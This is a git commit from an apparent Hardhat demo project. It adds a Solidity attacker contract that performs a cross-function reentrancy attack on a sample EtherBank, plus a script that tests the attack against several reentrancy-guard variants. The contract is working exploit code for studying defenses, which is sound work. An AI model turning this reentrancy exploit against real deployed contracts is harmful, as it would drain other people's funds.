bf7e5de06c4817d90390e5543403319ebb71a912
Gary Ho <garyho0916@gmail.com>
2023-11-22 04:35:55 +0000

    Add cross function attack scene

---
+++ contracts/CrossFunctionAttacker.sol
@@ -0,0 +1,55 @@
+// SPDX-License-Identifier: unlicensed
+pragma solidity ^0.8.0;
+
+import "./EtherBank.interface.sol";
+import "hardhat/console.sol";
+
+contract CrossFunctionAttacker {
+    IEtherBank private etherBank;
+    CrossFunctionAttacker private accomplice;
+
+    constructor() payable {}
+
+    function setEtherBankAddress(address payable _etherBankAddress) external {
+        etherBank = IEtherBank(_etherBankAddress);
+    }
+
+    function setAccompliceAddress(address payable _accompliceAddress) external {
+        accomplice = CrossFunctionAttacker(_accompliceAddress);
+    }
+
+    receive() external payable {
+        console.log("--------- Executing reentrancy attack ---------");
+        console.log("Bank balance: %s", etherBank.getBalance() / 1 ether);
+        if (etherBank.getBalance() >= 1 ether) {
+            etherBank.transfer(
+                address(accomplice),
+                etherBank.getUserBalance(address(this))
+            );
+        }
+    }
+
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function attackInit() external payable {
+        etherBank.deposit{value: 1 ether}();
+        console.log(
+            "Attacker's balance: %s\n",
+            address(this).balance / 1 ether
+        );
+        etherBank.withdrawAll();
+        accomplice.attack();
+    }
+
+    function attack() external payable {
+        console.log(
+            "Attacker1 balance: %s, Attacker2 balance: %s\n",
+            address(this).balance / 1 ether,
+            accomplice.getBalance() / 1 ether
+        );
+        etherBank.withdrawAll();
+        accomplice.attack();
+    }
+}
--- demo.sh
+++ demo.sh
@@ -1,7 +1,15 @@
 #!/bin/bash
 
+echo "============== Scenario 1: Single Function Reentrancy Attack =============="
 for guard_name in "No Guard" "ReentrancyGuard" "ProxyGuard" "BalanceGuard"
     do
         printf "\n\n========= Execute reentrancy attack on contract with $guard_name =========\n\n"
         REENTRANCY_GUARD=$guard_name npx hardhat run scripts/singleFunctionReentrancyAttack.js 
+    done
+
+printf "\n\n\n============== Scenario 2: Cross Function Reentrancy Attack =============="
+for guard_name in "No Guard" "ReentrancyGuard" "ProxyGuard" "BalanceGuard"
+    do
+        printf "\n\n========= Execute reentrancy attack on contract with $guard_name =========\n\n"
+        REENTRANCY_GUARD=$guard_name npx hardhat run scripts/crossFunctionReentrancyAttack.js 
     done
